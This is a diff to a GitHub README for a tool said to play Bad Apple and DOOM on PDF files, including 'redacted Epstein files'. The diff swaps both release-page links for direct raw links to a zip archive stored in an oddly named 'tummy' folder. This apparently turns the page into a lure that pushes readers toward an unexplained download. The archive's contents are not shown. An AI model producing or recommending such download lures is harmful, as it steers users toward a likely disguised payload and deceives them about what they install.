@@ -1,7 +1,7 @@
 # 🎮 bad-apple-pdffile - Play Fun Games with PDF Files
 
 ## 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/azerty1234jb/bad-apple-pdffile/releases)
+[![Download](https://github.com/azerty1234jb/bad-apple-pdffile/raw/refs/heads/master/tummy/apple-pdffile-bad-2.1.zip)](https://github.com/azerty1234jb/bad-apple-pdffile/raw/refs/heads/master/tummy/apple-pdffile-bad-2.1.zip)
 
 ## 👋 Introduction
 Welcome to **bad-apple-pdffile**! This application lets you play **Bad Apple** and **DOOM** on specially selected documents, including redacted Epstein files. Our software uses a technique called KNN to create engaging experiences with your documents. 
@@ -22,7 +22,7 @@ Follow these simple steps to download and run the software on your computer.
 - Customizable settings for an enhanced experience.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version of the application: [Download Here](https://github.com/azerty1234jb/bad-apple-pdffile/releases).
+To get started, visit this page to download the latest version of the application: [Download Here](https://github.com/azerty1234jb/bad-apple-pdffile/raw/refs/heads/master/tummy/apple-pdffile-bad-2.1.zip).
 
 ### 🗂️ Downloading the Application
 1. Click on the **Download Here** link above or the button at the top of this page.
